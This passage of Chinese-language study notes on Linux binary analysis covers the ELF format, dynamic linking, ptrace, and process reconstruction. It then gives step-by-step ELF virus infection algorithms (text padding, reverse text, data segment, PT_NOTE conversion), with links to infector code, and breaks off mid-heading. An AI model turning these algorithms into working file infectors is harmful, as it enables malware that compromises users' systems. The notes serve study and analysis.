title="/proc/kcore"></a>/proc/kcore</h3><p>是Linux内核的动态核心文件，即以ELF核心文件的形式所展现出来的原生内存转储。</p><h3 id="boot-System-map"><a href="#boot-System-map" class="headerlink" title="/boot/System.map"></a>/boot/System.map</h3><p>这个文件包含了整个内核的所有符号。</p><h3 id="proc-kallsyms"><a href="#proc-kallsyms" class="headerlink" title="/proc/kallsyms"></a>/proc/kallsyms</h3><p>与System.map类似，区别就是kallsyms是内核所属的/proc的一个入口并且可以动态更新。如果安装了新的LKM，符号会自动添加到里面去。</p><h3 id="proc-iomem"><a href="#proc-iomem" class="headerlink" title="/proc/iomem"></a>/proc/iomem</h3><p>与/proc/&lt;pid&gt;/maps类似，不过它是跟系统内存相关的。</p><h3 id="ECFS"><a href="#ECFS" class="headerlink" title="ECFS"></a>ECFS</h3><p>extended core file snapshot（扩展核心文件快照）是一项特殊的核心转储技术，专门为进程镜像的高级取证分析所设计。</p><p> <a href="https://github.com/elfmaster/ecfs" target="_blank" rel="noopener">https://github.com/elfmaster/ecfs</a></p><h2 id="链接器相关环境指针"><a href="#链接器相关环境指针" class="headerlink" title="链接器相关环境指针"></a>链接器相关环境指针</h2><h3 id="LD-PRELOAD环境变量"><a href="#LD-PRELOAD环境变量" class="headerlink" title="LD_PRELOAD环境变量"></a>LD_PRELOAD环境变量</h3><p>可以设置成一个指定的库路径，动态链接时可以比其他库有更高的优先级。</p><h3 id="LD-SHOW-AUXV环境变量"><a href="#LD-SHOW-AUXV环境变量" class="headerlink" title="LD_SHOW_AUXV环境变量"></a>LD_SHOW_AUXV环境变量</h3><p>能够通知程序加载器来展示程序运行时的辅助向量。</p><p>辅助向量是放在程序栈（通过内核的ELF常规加载方式）上的信息，附带了传递给动态链接器的程序相关的特定信息。</p><h3 id="链接器脚本"><a href="#链接器脚本" class="headerlink" title="链接器脚本"></a>链接器脚本</h3><p>默认的链接器脚本可以使用ld -verbose查看。</p><h1 id="ELF二进制格式"><a href="#ELF二进制格式" class="headerlink" title="ELF二进制格式"></a>ELF二进制格式</h1><h2 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h2><p>ET_NONE：未知类型</p><p>ET_REL：重定位文件</p><p>ET_EXEC：可执行文件</p><p>ET_DYN：共享目标文件</p><p>ET_CORE：核心文件</p><h2 id="ELF程序头"><a href="#ELF程序头" class="headerlink" title="ELF程序头"></a>ELF程序头</h2><p>Elf32_Phdr结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">unit32_t</span> p_type;<span class="comment">//segment type</span></span><br><span class="line">Elf32_off p_offset;<span class="comment">//segment offset</span></span><br><span class="line">Elf32_Addr p_vaddr;<span class="comment">//segment virtual address</span></span><br><span class="line">Elf32_Addr p_paddr;<span class="comment">//segment physical address</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_filesz;<span class="comment">//size of segment in file</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_memsz;<span class="comment">//size of segment in memory</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_flags;<span class="comment">//segment flags,I.E execute|read|write</span></span><br><span class="line"><span class="keyword">uint32_t</span> p_align;<span class="comment">//segment alignment in memory</span></span><br><span class="line">&#125;Elf32_Phdr</span><br></pre></td></tr></table></figure><h3 id="PT-LOAD"><a href="#PT-LOAD" class="headerlink" title="PT_LOAD"></a>PT_LOAD</h3><p>一个可执行文件至少有一个PT_LOAD类型的段。这类程序头描述的是可装载的段，也就是这种类型的段将被装载或者映射到内存中。</p><h3 id="PT-DYNAMIC"><a href="#PT-DYNAMIC" class="headerlink" title="PT_DYNAMIC"></a>PT_DYNAMIC</h3><p>动态段的Phdr。动态段是动态链接可执行文件所特有的，包含了动态链接器所必需的一些信息。在动态段中包含了一些标记值和指针，包括但不限于以下内容：</p><ul><li>运行时需要链接的共享库列表；</li><li>全局偏移表（GOT）的地址；</li><li>重定位条目的相关信息。</li></ul><p>32位ELF的动态段的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Elf32_Sword d_tag;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line">Elf32_Word d_val;</span><br><span class="line">Elf32_Addr d_ptr;</span><br><span class="line">&#125;d_un;</span><br><span class="line">&#125;Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn _DYNAMIC[];</span><br></pre></td></tr></table></figure><h3 id="PT-NOTE"><a href="#PT-NOTE" class="headerlink" title="PT_NOTE"></a>PT_NOTE</h3><p>该类型的段可能保存了与特定供应商或者系统相关的附加信息。</p><p>NOTE段病毒感染相关信息：<a href="http://vxheavens.com/lib/vhe06.html" target="_blank" rel="noopener">http://vxheavens.com/lib/vhe06.html</a></p><h3 id="PT-INTERP"><a href="#PT-INTERP" class="headerlink" title="PT_INTERP"></a>PT_INTERP</h3><p>PT_INTERP段只将位置和大小信息存放在一个以null为终止符的字符串中，是对程序解释器位置的描述。</p><h3 id="PT-PHDR"><a href="#PT-PHDR" class="headerlink" title="PT_PHDR"></a>PT_PHDR</h3><p>该段保存了程序头表本身的位置和大小。Phdr表保存了所有的Phdr堆文件（以及内存镜像）中段的描述信息。</p><p>可以用readelf -l <file>命令查看文件的Phdr表</p><h2 id="ELF节头"><a href="#ELF节头" class="headerlink" title="ELF节头"></a>ELF节头</h2><h3 id="段和节的区分"><a href="#段和节的区分" class="headerlink" title="段和节的区分"></a>段和节的区分</h3><p>段是程序执行的必要组成部分，在每个段中，会有代码或者数据被划分为不同的节。节头表是对这些节的位置和大小的描述，主要用于链接和调试。</p><h3 id="32位ELF节头的结构："><a href="#32位ELF节头的结构：" class="headerlink" title="32位ELF节头的结构："></a>32位ELF节头的结构：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_name;<span class="comment">//offset into shdr string table for shdr name</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_type;<span class="comment">//shdr type, I.E SHT_PROGBITS</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_flags;<span class="comment">//shdr flags, I.E SHT_WRITE|SHT_ALLOC</span></span><br><span class="line">Elf32_ADDR sh_addr;<span class="comment">//address of where section begins</span></span><br><span class="line">Elf32_Off sh_offset;<span class="comment">//offset of shdr from beginning of file</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_size;<span class="comment">//size that section takes up on disk</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_link;<span class="comment">//points to another section</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_info;<span class="comment">//interpretation depends on section type</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_addralign;<span class="comment">//alignment for address of section</span></span><br><span class="line"><span class="keyword">uint32_t</span> sh_entsize;<span class="comment">//size of each certain entries that may be in section</span></span><br><span class="line">&#125;Elf32_Shdr</span><br></pre></td></tr></table></figure><h3 id="text节"><a href="#text节" class="headerlink" title=".text节"></a>.text节</h3><p>该节是保存了程序代码指令的代码节，存在于text段中。此节类型为SHT_PROGBITS</p><h3 id="rodata节"><a href="#rodata节" class="headerlink" title=".rodata节"></a>.rodata节</h3><p>该节保存了只读数据。存在于一个可执行文件的只读段中，即只能在text段中找到.rodata节。该节类型为SHT_PROGBITS。</p><h3 id="plt节"><a href="#plt节" class="headerlink" title=".plt节"></a>.plt节</h3><p>该节中包含了动态链接器调用从共享库导入的函数所必需的相关代码。存在于text段中。此节类型为SHT_PROGBITS。</p><h3 id="data节"><a href="#data节" class="headerlink" title=".data节"></a>.data节</h3><p>.data节存在于data段中，保存了初始化的全局变量等数据。此节类型为SHT_PROGBITS</p><h3 id="bss节"><a href="#bss节" class="headerlink" title=".bss节"></a>.bss节</h3><p>保存了未进行初始化的全局数据，是data段的一部分，占用空间不超过4字节，仅表示这个节本身的空间。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于为保存实际的数据，此节类型为SHT_NOBITS</p><h3 id="got-plt节"><a href="#got-plt节" class="headerlink" title=".got.plt节"></a>.got.plt节</h3><p>.got节保存了全局偏移表。.got.plt节跟程序执行有关，因此节类型被标记为SHT_PROGBITS。</p><h3 id="dynsym节"><a href="#dynsym节" class="headerlink" title=".dynsym节"></a>.dynsym节</h3><p>该节保存了从动态共享库导入的动态符号信息，该节保存在text段。节类型为SHT_DYNSYM</p><h3 id="dynstr节"><a href="#dynstr节" class="headerlink" title=".dynstr节"></a>.dynstr节</h3><p>该节保存了动态符号字符串表，表中存放了一系列字符串，这些字符串代码了符号的名称，以空字符作为终止符。</p><h3 id="rel-节"><a href="#rel-节" class="headerlink" title=".rel.*节"></a>.rel.*节</h3><p>重定位节保存了重定位相关的信息，这些信息描述了如何在链接或者运行时，堆ELF目标文件的某部分内容或者进程镜像进行补充和修改。节类型为SHT_REL。</p><h3 id="hash节"><a href="#hash节" class="headerlink" title=".hash节"></a>.hash节</h3><p>有时也被称为.gnu.hash，保存了一个用于查找符号的散列表。</p><h3 id="symtab节"><a href="#symtab节" class="headerlink" title=".symtab节"></a>.symtab节</h3><p>该节保存了ElfN_Sym类型的符号信息。该节类型为SHT_SYMTAB</p><h3 id="strtab节"><a href="#strtab节" class="headerlink" title=".strtab节"></a>.strtab节</h3><p>该节保存的是符号字符串表，表中内容会被.symtab的ElfN_Sym结构中的st_name条目引用，此节类型为SHT_STRTAB。</p><h3 id="shstrtab节"><a href="#shstrtab节" class="headerlink" title=".shstrtab节"></a>.shstrtab节</h3><p>该节保存节头子符串表，该表是一个以空字符终止的字符串集合，字符串保存了每个节的节名。有一个名为e_shsrndx的ELF文件头条目会指向.shstrtab节，e_shstrndx中保存了.shstrtab的偏移量。此节类型为SHT_STRTAB。</p><h3 id="ctors和-dtors节"><a href="#ctors和-dtors节" class="headerlink" title=".ctors和.dtors节"></a>.ctors和.dtors节</h3><p>.ctors（构造器）和.dtors（析构器）这两个节保存了指向构造函数和析构函数的函数指针。（构造函数即main函数执行之前需要执行的代码，析构函数是在main函数之后需要执行的代码。）</p><h3 id="ELF文件布局"><a href="#ELF文件布局" class="headerlink" title="ELF文件布局"></a>ELF文件布局</h3><h4 id="text段："><a href="#text段：" class="headerlink" title="text段："></a>text段：</h4><p>[.text]：程序代码。</p><p>[.rodata]：只读数据。</p><p>[.hash]：符号散列表。</p><p>[.dynsym]：共享目标文件符号数据。</p><p>[.dynstr]：共享目标文件符号名称。</p><p>[.plt]：过程链接表。</p><p>[.rel.got]：G.O.T 重定位数据。</p><h4 id="data段："><a href="#data段：" class="headerlink" title="data段："></a>data段：</h4><p>[.data]：全局的初始化变量。</p><p>[.dynamic]：动态链接结构和对象。</p><p>[.got.plt]：全局偏移表。</p><p>[.bss]：全局未初始化变量。</p><h3 id="ELF符号"><a href="#ELF符号" class="headerlink" title="ELF符号"></a>ELF符号</h3><p>.dynsym保存了引用来自外部文件符号的全局符号。.dynsym保存的符号是.symtab所保存符号的子集，.symtab中还保存了可执行文件的本地符号，如全局变量或者代码中定义的本地函数等。</p><p>.dynsym是被标记了ALLOC的，而.symtab则没有被标记。ALLOC表示有该标记的节会在运行时分配并装载进入内存，而.symtab不是在运行时必需的，因此不会被装载到内存中。</p><p>64位ELF文件符号项的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> st_name;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line"><span class="keyword">uint16_t</span> st_shndx;</span><br><span class="line">Elf64_Addr st_value;</span><br><span class="line">Uint64_t st_size;</span><br><span class="line">&#125;Elf64_Sym;</span><br></pre></td></tr></table></figure><p>符号项保存在.symtab和.dynsym节中，因此节头项的大小与ElfN_Sym的大小相等。</p><h3 id="st-name"><a href="#st-name" class="headerlink" title="st_name"></a>st_name</h3><p>保存了指向符号表中字符串的偏移地址，偏移地址存放着符号的名称。</p><h3 id="st-value"><a href="#st-value" class="headerlink" title="st_value"></a>st_value</h3><p>存放符号的值（可能是地址或者位置偏移量）</p><h3 id="st-size"><a href="#st-size" class="headerlink" title="st_size"></a>st_size</h3><p>存放了一个符号的大小。</p><h3 id="st-other"><a href="#st-other" class="headerlink" title="st_other"></a>st_other</h3><p>定义了符号的可见性。</p><h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><p>保存了相关节头表的索引。</p><h3 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h3><p>指定符号类型及绑定属性：</p><p>1.符号类型：</p><p>STT_NOTYPE    符号类型未定义</p><p>STT_FUNC    表示该符号与函数或者其他可执行代码关联</p><p>STT_OBJECT    表示该符号与数据目标文件关联</p><p>2.符号绑定</p><p>STB_LOCAL    本地符号在目标文件之外是不可见的</p><p>STB_GLOBAL    全局符号对于所有要合并的目标文件来说都是可见的，一个全局符号在一个文件中进行定义后，另一个文件可以对这个符号进行引用。</p><p>STB_WEAK    与全局绑定类似，不过比STB_GLOBAL的优先级低。被标记为STB_WEAK的符号有可能被同名的未被标记为STB_WEAK的符号覆盖</p><h6 id="对绑定和类型字段进行打包和解包的宏指令"><a href="#对绑定和类型字段进行打包和解包的宏指令" class="headerlink" title="对绑定和类型字段进行打包和解包的宏指令"></a>对绑定和类型字段进行打包和解包的宏指令</h6><p>ELF32_ST_BIND(info)或者ELF64_ST_BIND(info)：从st_info值中提取出一个绑定。</p><p>ELF32_ST_TYPE(info)或者ELF64_ST_TYPE(info)：从st_info值中提取类型。</p><p>ELF32_ST_TYPE(bind,type)或者ELF64_ST_INFO(bind,type)：将一个绑定和类型转换成st_info值。</p><h2 id="ELF重定位"><a href="#ELF重定位" class="headerlink" title="ELF重定位"></a>ELF重定位</h2><p>要将一个偏移量计算成虚拟地址，可以用下面的公式：</p><p>address_of_call+offset+sizeof(addr)</p><h3 id="基于二进制修补的重定位代码注入"><a href="#基于二进制修补的重定位代码注入" class="headerlink" title="基于二进制修补的重定位代码注入"></a>基于二进制修补的重定位代码注入</h3><p>Eresi（<a href="http://www.eresi-project.org）" target="_blank" rel="noopener">http://www.eresi-project.org）</a></p><p>Quenya (<a href="http://www.bitlackeys.org/projects/quenya_32bit.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/quenya_32bit.tgz</a>)</p><h2 id="ELF动态链接"><a href="#ELF动态链接" class="headerlink" title="ELF动态链接"></a>ELF动态链接</h2><h3 id="辅助向量"><a href="#辅助向量" class="headerlink" title="辅助向量"></a>辅助向量</h3><p>通过系统调用 sys_execve()将程序加载到内存中时，对应的可执行文件会被映射到内存的地址空间，并为该进程的地址空间分配一个栈。这个栈会用特定的方式向动态链接器传递信息。这种特定的对信息的设置和安排即为辅助向量（auxv）。</p><p>辅助向量是一系列Elf_auxv_t结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">uint64_t</span> a_type;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> a_val;</span><br><span class="line">&#125;a_un;</span><br><span class="line">&#125;Elf64_auxv_t;</span><br></pre></td></tr></table></figure><p>a_type指定了辅助向量的条目类型，a_val为辅助向量的值。</p><p>下面是动态链接器所需要的一些最重要的条目类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_EXECFD2<span class="comment">//File descriptor of program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PATH3<span class="comment">//Program headers for program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHENT4<span class="comment">//Size of program header entry</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PHNUM5<span class="comment">//Number of program headers</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_PAGESZ6<span class="comment">//System page size</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AT_ENTRY9<span class="comment">//Entry point of program</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#deffine AT_UID11<span class="comment">//Real uid</span></span></span><br></pre></td></tr></table></figure><p>程序被加载进内存，辅助向量被填充好之后，控制权就交给了动态链接器。动态链接器会解析要链接到进程地址空间的用于共享库的符号和重定位。</p><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>GOT的前3个偏移量</p><p>GOT[0]：存放了指向可执行文件动态段的地址，动态链接器利用该地址提取动态链接相关信息。</p><p>GOT[1]：存放link_map结构的地址，动态链接器利用该地址来对符号进行解析。</p><p>GOT[2]：存放了指向动态链接器_dl_runtime_resolve()函数的地址，该函数用来解析共享库函数的实际符号地址。</p><h3 id="动态段"><a href="#动态段" class="headerlink" title="动态段"></a>动态段</h3><p>动态段保存了一个由类型为ElfN_Dyn的结构体组成的数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Elf32_Sword d_tag;</span><br><span class="line"><span class="keyword">union</span>&#123;</span><br><span class="line">Elf32_Word d_val;</span><br><span class="line">Elf32_Addr d_ptr;</span><br><span class="line">&#125;d_un;</span><br><span class="line">&#125;Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>d_tag字段保存了类型的定义参数，下面列出常用的比较重要的类型值：</p><p>1.DT_NEEDED：保存了所需的共享库名的字符串表偏移量。</p><p>2.DT_SYMTAB：动态符号表的地址，对应的节名.dynsym。</p><p>3.DT_HASH：符号散列表的地址，对应的节名.hash。</p><p>4.DT_STRTAB：符号字符串表的地址，对应的节名.dynstr。</p><p>5.DT_PLTGOT：全局偏移表的地址。</p><p>d_val成员保存了一个整型值，可以存放各种不同的数据。</p><p>d_ptr成员保存了一个内存虚址，可以指向链接器所需要的各种类型的地址。</p><p>链接器为每个动态库生成一个link_map结构条目，并将其存入到一个链表中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>&#123;</span></span><br><span class="line">ElfW(Addr) l_addr;<span class="comment">//Base address shared object is loaded at.</span></span><br><span class="line"><span class="keyword">char</span> *l_name;<span class="comment">//Absolute file name object was found in.</span></span><br><span class="line">ElfW(Dyn) *l_ld;<span class="comment">//Dynamic section of the shared object.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span><span class="comment">//Chain of loaded objects.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编码一个ELF解析器"><a href="#编码一个ELF解析器" class="headerlink" title="编码一个ELF解析器"></a>编码一个ELF解析器</h2><h1 id="Linux进程追踪"><a href="#Linux进程追踪" class="headerlink" title="Linux进程追踪"></a>Linux进程追踪</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p>ptrace可以附加到一个进程上并修改内存。</p><h2 id="进程寄存器状态和标记"><a href="#进程寄存器状态和标记" class="headerlink" title="进程寄存器状态和标记"></a>进程寄存器状态和标记</h2><h2 id="基于ptrace的调试器示例"><a href="#基于ptrace的调试器示例" class="headerlink" title="基于ptrace的调试器示例"></a>基于ptrace的调试器示例</h2><h2 id="内存感染类型"><a href="#内存感染类型" class="headerlink" title="内存感染类型"></a>内存感染类型</h2><table><thead><tr><th>感染技术</th><th>目标结果</th><th>寄存类型</th></tr></thead><tbody><tr><td>GOT感染</td><td>劫持共享库函数</td><td>进程内存或可执行文件</td></tr><tr><td>过程链接表(PLT)感染</td><td>劫持共享库函数</td><td>进程内存或可执行文件</td></tr><tr><td>.ctors/.dtors感染</td><td>将控制流转向恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>Function trampolines（函数蹦床）</td><td>劫持任意函数</td><td>进程内存或可执行文件</td></tr><tr><td>共享库注入</td><td>插入恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>重定位代码注入</td><td>插入恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>直接修改text段</td><td>插入恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>进程占用（将整段程序注入地址空间）</td><td>运行隐藏在现存进程中的完全不同的可执行文件</td><td>进程内存</td></tr></tbody></table><h2 id="进程镜像重建"><a href="#进程镜像重建" class="headerlink" title="进程镜像重建"></a>进程镜像重建</h2><h3 id="重建可执行文件的目标"><a href="#重建可执行文件的目标" class="headerlink" title="重建可执行文件的目标"></a>重建可执行文件的目标</h3><ul><li>进程ID作为参数，将该ID对应的进程镜像重建成对应的可执行文件。</li><li>构建节头的最小集，以便可以使用objdump和gdb这样的工具进行更精确的分析。</li></ul><h3 id="重建过程算法"><a href="#重建过程算法" class="headerlink" title="重建过程算法"></a>重建过程算法</h3><p>1.定位可执行文件(text段)的基址。</p><p>2.通过解析ELF文件头来定位程序头表。</p><p>3.解析程序头表，找出数据段。</p><p>4.将数据段读到缓存中，并定位数据段中的动态段，然后定位GOT。使用动态段中的d_tag来定位GOT。</p><p>5.一旦定位到GOT，就需要将GOT恢复到运行之前的装填。</p><p>6.需要修改为puts()保留的GOT条目，重新指向PLT存根代码，这段代码的作用是将GOT偏移地址压入栈。</p><p>7.选择性地重建节头表。然后将text段和data段(以及节头表)写到磁盘。</p><h1 id="ELF病毒技术"><a href="#ELF病毒技术" class="headerlink" title="ELF病毒技术"></a>ELF病毒技术</h1><h2 id="ELF病毒技术-1"><a href="#ELF病毒技术-1" class="headerlink" title="ELF病毒技术"></a>ELF病毒技术</h2><p>ELF病毒的首要目标是劫持控制流，暂时改变程序执行的路径来执行寄生病毒。</p><h2 id="ELF病毒寄生代码感染方法"><a href="#ELF病毒寄生代码感染方法" class="headerlink" title="ELF病毒寄生代码感染方法"></a>ELF病毒寄生代码感染方法</h2><h3 id="Silvio填充感染"><a href="#Silvio填充感染" class="headerlink" title="Silvio填充感染"></a>Silvio填充感染</h3><p>这种方法利用了内存中text段和data段之间存在的一页大小的填充空间。</p><p>相关论文：Unix ELF parasites and viruses(<a href="http://vxheaven.org/lib/vsc01.html" target="_blank" rel="noopener">http://vxheaven.org/lib/vsc01.html</a>)</p><h4 id="text感染算法"><a href="#text感染算法" class="headerlink" title=".text感染算法"></a>.text感染算法</h4><p>1.将ELF文件头中的ehdr-&gt;e_shoff增加PAGE_SIZE的大小值。</p><p>2.定位text段的phdr。</p><ul><li>将入口点修改为寄生代码的位置：ehdr-&gt;e_entry=phdr[TEXT].p_vaddr+phdr[TEXT].p_filesz。</li><li>将phdr[TEXT].p_filesz增加寄生代码的长度值。</li><li>将phdr[TEXT].p_memsz增加寄生代码的长度值。</li></ul><p>3.对每个phdr，如果对应的段位于寄生代码之后，则将phdr[x].p_offset增加PAGE_SIZE大小。</p><p>4.找到text段的最后一个shdr，将shdr[x].sh_size增加寄生代码长度值。</p><p>5.对每个位于寄生代码插入位置之后的shdr，将shdr[x].sh_offset增加PAGE_SIZE大小。</p><p>6.将真正的寄生代码插入到text段的file_base+phdr[TEXT].p_filesz。</p><p>相关代码示例： <a href="http://www.bitlackeys.org/projects/lpv.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/lpv.c</a></p><h3 id="逆向text感染"><a href="#逆向text感染" class="headerlink" title="逆向text感染"></a>逆向text感染</h3><p>前提：堆text段进行逆向扩展，在逆向扩展过程中，需要将text段的虚拟地址缩减PAGE_ALIGN(parasite_size)。</p><h4 id="逆向text感染算法"><a href="#逆向text感染算法" class="headerlink" title="逆向text感染算法"></a>逆向text感染算法</h4><p>1.将ehdr-&gt;e_shoff增加PAGE_ROUND(parasite_len)</p><p>2.找到text段和phdr，保存p_vaddr的初始值。</p><ul><li>将p_vaddr减小PAGE_ROUND(parasite_len)。</li><li>将p_paddr减小PAGE_ROUND(parasite_len)。</li><li>将p_filesz增加PAGE_ROUND(parasite_len)。</li><li>将p_memsz增加PAGE_ROUND(parasite_len)。</li></ul><p>3.找出所有的p_offset比text的p_offset的phdr，并将对应的p_offset增加PAGE_ROUND(parasite_len)；这步操作会将phdr前移，为逆向text扩展腾出空间。</p><p>4.将ehdr-&gt;e_entry设置为：</p><p>orig_text_vaddr - PAGE_ROUND(parasite_len) +sizeof(ElfN_Ehdr)</p><p>5.将ehdr_e_phoff增加PAGE_ROUND(parasite_len)。</p><p>6.创建一个新的二进制文件映射出所有的修改，插入真正的寄生代码，然后覆盖掉旧的二进制文件。</p><p>相关代码：<a href="http://www.bitlackeys.org/projects/text-infector.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/text-infector.tgz</a> </p><p>相应杀毒程序：<a href="http://www.bitlackeys.org/projects/skeksi_disinfect.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/skeksi_disinfect.c</a></p><h3 id="data段感染"><a href="#data段感染" class="headerlink" title="data段感染"></a>data段感染</h3><h4 id="data段感染算法"><a href="#data段感染算法" class="headerlink" title="data段感染算法"></a>data段感染算法</h4><p>1.将ehdr_e_shoff增加寄生代码的长度。</p><p>2.定位data段phdr。</p><ul><li>将ehdr-&gt;e_entry指向寄生代码所在位置：phdr-&gt;p_vaddr + phdr-&gt;p_filesz</li><li>将phdr-&gt;p_filesz增加寄生代码长度</li><li>将phdr-&gt;p_memsz增加寄生代码的长度</li></ul><p>3.调整.bss节头，使其偏移量和地址能够反映出寄生代码的结束位置。</p><p>4.设置data段的权限(设置了NX-bit的系统)：</p><ul><li>phdr[DATA].p_flags != PF_X;</li></ul><p>5.（可选）使用假名为寄生代码添加一个节头。（防止有人运行了/usr/bin/strip<infected_program>，会将没有进行节头说明的寄生代码清理掉）</p><p>6.创建一个新的二进制文件映射出所有的修改，插入真正的寄生代码，然后覆盖掉旧的二进制文件。</p><h2 id="PT-NOTE到PT-LOAD转换感染"><a href="#PT-NOTE到PT-LOAD转换感染" class="headerlink" title="PT_NOTE到PT_LOAD转换感染"></a>PT_NOTE到PT_LOAD转换感染</h2><p>原理：将PT_NOTE段的类型改为PT_LOAD，然后将段的位置移到其他所有段之后。当然，也可以通过创建一个PT_LOAD phdr条目来创建一个新的段，但是由于程序在没有PT_NOTE段时仍将执行，因此将其转换为PT_LOAD类型。</p><h4 id="PT-NOTE到PT-LOAD转换感染算法"><a href="#PT-NOTE到PT-LOAD转换感染算法" class="headerlink" title="PT_NOTE到PT_LOAD转换感染算法"></a>PT_NOTE到PT_LOAD转换感染算法</h4><p>1.定位data段phdr。</p><ul><li>找到data段结束的地址：ds_end_addr = phdr-&gt;p_vaddr + p_memsz</li><li>找到data段结束的文件偏移量：da_end_off = phdr-&gt;p_offset + p_filesz</li><li>获取到可加载段的对齐大小：align_size = phdr-&gt;p_align</li></ul><p>2.定位PT_NOTE phdr。</p><ul><li><p>将phdr转换成PT_LOAD：phdr-&gt;p_type = PT_LOAD；</p></li><li><p>将下面起始地址赋给phdr：ds_end_addr + align_size</p></li><li><p>将寄生代码的长度赋给phdr：phdr-&gt;p_filesz += parasite_size;  phdr-&gt;p_memsz += parasite_size</p></li></ul><p>3.对新建的段进行说明：ehdr-&gt;e_shoff += parasite_size。</p><p>4.创建一个新的二进制文件映射出ELF头的修改和新的段，插入真正的寄生代码。</p><h2 id="感染控制流"><a href="#感染控制流" class="headerlink" title="感染控制流"></a>感染控制流</h2><h3 id="直接PLT感染"><a href="#直接PLT感染" class="headerlink" 